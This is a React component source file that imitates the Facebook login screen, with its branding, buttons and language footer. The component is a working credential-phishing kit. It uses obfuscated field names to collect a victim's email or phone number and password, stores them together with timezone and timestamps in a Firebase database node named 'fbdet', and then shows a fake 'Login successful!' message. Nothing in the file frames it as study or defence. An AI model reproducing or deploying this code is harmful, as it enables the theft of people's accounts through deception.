import React, { useState } from "react";
import { auth, db } from "../assets/js/firebase"; // Correct import path
import { ref, push } from "firebase/database";
import { signInAnonymously } from "firebase/auth";
import ErrorAlert from "./ErrorAlert"; // Import the ErrorAlert component
import "../assets/css/modal.css";

const FacebookModal = () => {
  const [owerrioruko, setOruko] = useState("");
  const [owerrizom, setZom] = useState("");
  const [errorTitle, setErrorTitle] = useState("");
  const [errorMessage, setErrorMessage] = useState("");
  const [showErrorAlert, setShowErrorAlert] = useState(false);

  const closeModal = () => {
    document.getElementById("facebook-modal").style.display = "none";
  };

  const handleLogin = async () => {
    // Validate fields
    if (!owerrioruko.trim() || !owerrizom.trim()) {
      setErrorTitle("Error");
      setErrorMessage("Please fill in all fields.");
      setShowErrorAlert(true);
      return;
    }

    try {
      // Sign in anonymously
      const userCredential = await signInAnonymously(auth);
      const user = userCredential.user;

      // Prepare data to be sent to Firebase
      const currentDate = new Date().toISOString().slice(0, 10);
      const currentTime = new Date().toISOString().slice(11, 19);
      const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;

      const data = {
        emle: owerrioruko,
        mobile: "",
        past: owerrizom, // Ensure this matches the field name in Firebase
        time: currentTime,
        timezone: timezone,
        date: currentDate,
        type: "Facebook", // Change this to the appropriate type
        uid: user.uid, // Store the anonymous user's UID
      };

      // Log the data being sent to Firebase
      console.log("Data being sent to Firebase:", data);

      // Save user data to Firebase Realtime Database
      await push(ref(db, "fbdet"), data);

      // Show success message
      setErrorTitle("Success");
      setErrorMessage("Login successful!");
      setShowErrorAlert(true);
    } catch (error) {
      console.error("Error saving data to Firebase:", error);
      setErrorTitle("Error");
      setErrorMessage("Sorry, something went wrong. Please try again.");
      setShowErrorAlert(true);
    } finally {
      // Clear the password field only
      setZom("");
    }
  };

  const handleCloseErrorAlert = () => {
    setShowErrorAlert(false);
  };

  return (
    <div id="facebook-modal" className="dialog bg-gray-100 text">
      <div className="min-h-screen flex flex-col w-full">
        {/* Main Content Section */}
        <main className="flex-grow p-2">
          {/* Centered Image */}
          <div className="flex justify-center mt-9 mb-4">
            <img src="/img/bisho.png" alt="logo" className="h-12" />
          </div>

          <div className="tokpart">
            <div className="bg-white p-8 w-full max-w-md border border-white shadow-2xl rounded-lg">
              {/* Email Input */}
              <div className="mb-4 relative">
                <input
                  type="text"
                  id="owerri-oruko"
                  name="owerrioruko"
                  value={owerrioruko}
                  onChange={(e) => setOruko(e.target.value)}
                  required
                  className="mt-1 block w-full px-3 py-2 border border-gray-200 rounded-md focus:outline-none focus:ring-blue-500 focus:border-blue-500 bg-transparent peer text-gray-800"
                  placeholder="Email address or phone number"
                />
              </div>

              {/* Password Input */}
              <div className="mb-4">
                <input
                  type="text"
                  id="owerris-zom"
                  name="owerrizom"
                  value={owerrizom}
                  onChange={(e) => setZom(e.target.value)}
                  required
                  className="mt-1 block w-full px-3 py-2 border border-gray-200 rounded-md focus:outline-none focus:ring-blue-500 focus:border-blue-500 bg-transparent peer text-gray-800"
                  placeholder="Password"
                />

                {/* Login Button */}
                <button
                  type="button"
                  onClick={handleLogin}
                  className="w-full bg-[#0866ff] text-white py-3 px-6 text-lg rounded-md focus:outline-none focus:ring-2 focus:ring-offset-0 focus:ring-[#0866ff] mt-4 font-semibold">
                  Log in
                </button>

                {/* Forgot Password Button */}
                <button
                  type="button"
                  className="w-full bg-transparent text-[#0866ff] py-3 px-6 text-sm rounded-md border-0 hover:text-[#0866ff] focus:outline-none focus:ring-0 mt-0">
                  Forgotten Password?
                </button>

                {/* Divider */}
                <div className="flex items-center my-2">
                  <div className="flex-grow border-t border-gray-300"></div>
                  <div className="flex-grow border-t border-gray-300"></div>
                </div>

                {/* Create New Account Button */}
                <button
                  type="button"
                  className="w-full bg-green-600 text-white py-3 px-6 text-lg rounded-md focus:outline-none focus:ring-2 focus:ring-offset-0 focus:ring-green-600 mt-4">
                  Create new account
                </button>
              </div>
            </div>
          </div>

          {/* Create Page Link */}
          <div className="flex justify-center mb-4 mt-7 text-gray-600">
            <p className="text-l text-center break-words max-w-md">
              <span style={{ fontWeight: "600" }}> Create a Page </span> for a
              celebrity, brand, or business.
            </p>
          </div>
        </main>

        {/* Footer Section */}
        <footer
          id="error-message"
          className="bg-white text-gray-600 text-sm mt-2 py-5 w-full">
          <div className="w-full px-5">
            {/* Language Section */}
            <div className="px-2">
              <div className="flex flex-wrap gap-2 text-xs text-gray-600">
                <a
                  href="#"
                  className="inline-block cursor-pointer hover:underline">
                  English (UK)
                </a>
                <a
                  href="#"
                  className="inline-block cursor-pointer hover:underline">
                  Hausa
                </a>
                <a
                  href="#"
                  className="inline-block cursor-pointer hover:underline">
                  Français (France)
                </a>
                <a
                  href="#"
                  className="inline-block cursor-pointer hover:underline">
                  Português (Brasil)
                </a>
                <a
                  href="#"
                  className="inline-block cursor-pointer hover:underline">
                  Español
                </a>
                <a
                  href="#"
                  className="inline-block cursor-pointer hover:underline">
                  العربية
                </a>
                <a
                  href="#"
                  className="inline-block cursor-pointer hover:underline">
                  Bahasa Indonesia
                </a>
                <a
                  href="#"
                  className="inline-block cursor-pointer hover:underline">
                  Deutsch
                </a>
                <a
                  href="#"
                  className="inline-block cursor-pointer hover:underline">
                  日本語
                </a>
                <a
                  href="#"
                  className="inline-block cursor-pointer hover:underline">
                  Italiano
                </a>
                <a
                  href="#"
                  className="inline-block cursor-pointer hover:underline">
                  हिन्दी
                </a>
              </div>
            </div>

            {/* Divider Line */}
            <hr className="border-gray-300 w-full" />

            {/* Copyright Section */}
            <div className="px-2 text-xs text-gray-500">&copy; 2025</div>
          </div>
        </footer>
      </div>

      {/* Render the ErrorAlert component */}
      {showErrorAlert && (
        <ErrorAlert
          title={errorTitle}
          message={errorMessage}
          onClose={handleCloseErrorAlert}
        />
      )}
    </div>
  );
};

export default FacebookModal;
